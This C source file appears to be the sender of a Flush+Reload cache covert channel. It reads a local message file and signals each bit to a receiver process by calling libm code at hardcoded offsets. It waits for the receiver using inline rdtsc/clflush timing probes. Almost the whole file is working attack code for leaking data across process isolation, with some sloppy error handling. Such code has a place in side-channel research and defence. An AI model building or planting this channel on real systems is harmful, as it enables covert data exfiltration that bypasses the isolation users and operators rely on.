#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <math.h>
#include <pthread.h>
#include <stdarg.h>
#include <unistd.h>

#define THRESHOLD 150
#define LIBMATH_PATH "/lib64/libm.so.6"
//#define LIBMATH_FMODF "fmodf"
//#define LIBMATH_FMODF_OFFSET 4 // annobin_w_exp10f_compat.c_end
#define LIBMATH_ATANHF "atanhf"
#define LIBMATH_ATANHF_OFFSET 0xc
#define LIBMATH_ACOS "acos"
#define LIBMATH_ACOS_OFFSET 0x42

pthread_mutex_t stopMutex;
int signal = 0;

static void error(const char * format, ...) {
	va_list myargs;
	va_start(myargs, format);
	printf("[\033[31;1m!\033[0m] ");
	vprintf(format, myargs);
	printf("\n");
	exit(1);
}

/* FLUSH + RELOAD probe function */
int probe(void *addr) {
	volatile unsigned long time;
	asm __volatile__ (
		" mfence \n"
		" lfence \n"
		" rdtsc \n"
		" lfence \n"
		" movl %%eax, %%esi \n"
		" movl (%1), %%eax \n"
		" lfence \n"
		" rdtsc \n"
		" subl %%esi, %%eax \n"
		" clflush 0(%1) \n"
		: "=a" (time)
		: "c" (addr)
		: "%esi", "%edx");
	if ( time < THRESHOLD ) {
		return 1;
	}
	return 0;
}

/* Probing thread */
void *probe_thread(void *arg) {
	char *dl_error;
	void *library = dlopen(LIBMATH_PATH, RTLD_NOW);
	if (!library) {
		error("dlopen failed: %s",dl_error);
	}

	void *acos= dlsym(library, LIBMATH_ACOS);
	if ((dl_error = dlerror()) != NULL)  {
		error("error in dlsym : %s",dl_error);
	}

    acos += LIBMATH_ACOS_OFFSET;
	printf("annobin_w_acos_compat.c_end is at %p\n", acos);

    // wait for signal from receiver
	while ( probe(acos) == 0 ) { }

    pthread_mutex_lock(&stopMutex);
    signal = 1;
    pthread_mutex_unlock(&stopMutex);

    dlclose(library);
	pthread_exit(NULL);
}

int main(void)
{
    float test = 0.0, x = 0.0;
    double y = -1.0;
    char junk[100] = { '\0' };

    FILE* fp = NULL;
    unsigned char* message = NULL;
    size_t f_size = 0, bytes_read = 0;

    fp = fopen("message.txt", "rb");
    if ( !fp ) {
        puts("[!] Failed to open the file.");
        exit(EXIT_FAILURE);
    }
    
    // Get file size
    fseek(fp, 0L, SEEK_END);
    f_size = ftell(fp);
    rewind(fp);

    message = malloc(f_size * sizeof(char));
    if ( !message ) {
        puts("[!] Failed to allocate memory.");
        exit(EXIT_FAILURE);
    }

    // Read file content
    bytes_read = fread(message, f_size, sizeof(char), fp);
    if ( !bytes_read ) {
        puts("[!] Failed to read the file.");
        exit(EXIT_FAILURE);
    }

    /*
     * Get addresses of instructions to call
     */

	char *dl_error = NULL;
	void *library = dlopen(LIBMATH_PATH, RTLD_NOW);
	if (!library) {
		printf("dlopen failed: %s\n", dl_error);
	}

    // math:asin()
	void *asin = dlsym(library, "asin");
	if ((dl_error = dlerror()) != NULL)  {
		printf("error in dlsym : %s\n", dl_error);
	}
    else {
        printf("annobin_w_asin_compat.c_end at %p\n", asin+0x42);
    }
    void (*annobin_0)() = asin+0x42;

    // math:tgammaf()
	void *tgammaf = dlsym(library, "tgammaf");
	if ((dl_error = dlerror()) != NULL)  {
		printf("error in dlsym : %s\n", dl_error);
	}
    else {
        printf("annobin_k_standardf.c_end at %p\n", tgammaf+0x54e);
    }
    void (*annobin_1)() = tgammaf+0x54e;

    // math:fegetenv()
	void *fegetenv= dlsym(library, "fegetenv");
	if ((dl_error = dlerror()) != NULL)  {
		printf("error in dlsym : %s\n", dl_error);
	}
    else {
        printf("annobin_w_exp10f_compat.c_end at %p\n", fegetenv-0x4);
    }
    void (*annobin_2)(char* junk) = fegetenv-0x4;

    // math:atanhf()
	void *atanhf = dlsym(library, "atanhf");
	if ((dl_error = dlerror()) != NULL)  {
		printf("error in dlsym : %s\n", dl_error);
	}
    else {
        printf("annobin_w_atan2f_compat.c_end at %p\n", atanhf-0xc);
    }
    void (*annobin_3)() = atanhf-0xc;

    puts("[+] Waiting for receiver to signal its presence..");

    // Probe for start signal from "receiver"
	pthread_t probe_t;
	if(pthread_create(&probe_t, NULL, probe_thread, NULL) == -1) {
		error("can't create probe thread");
	}

    while ( !signal ) { }
	pthread_cancel(probe_t);
    puts("[+] Receiver present, start sending..");

    // Wait a few second, it seem to give less false positives than when calling
    // functions directly after.
    sleep(2);

    // Call functions to put instruction into the cache
    puts("[+] Calling functions..");

    //printf("message = %s\n", message);

    while (*message != '\0') {
        for (int i = 0; i < 8; i++) {
            if ( *message & (128 >> i) ) {
                // '1';
                for (int i = 0; i < 20; i++) {
                    annobin_0();
                    annobin_0();
                }
            }
            else {
                // '0'
                annobin_1();
                annobin_1();
                annobin_1();
                annobin_1();
            }

            // Delimit bits
            for (int i = 0; i < 20; i++) {
                annobin_2(junk);
                annobin_2(junk);
            }
        }

        message++;
    }

    // Signal receiver there is nothing more
    for (int i = 0; i < 200; i++) {
        annobin_3();
        annobin_3();
    }

    return EXIT_SUCCESS;
}
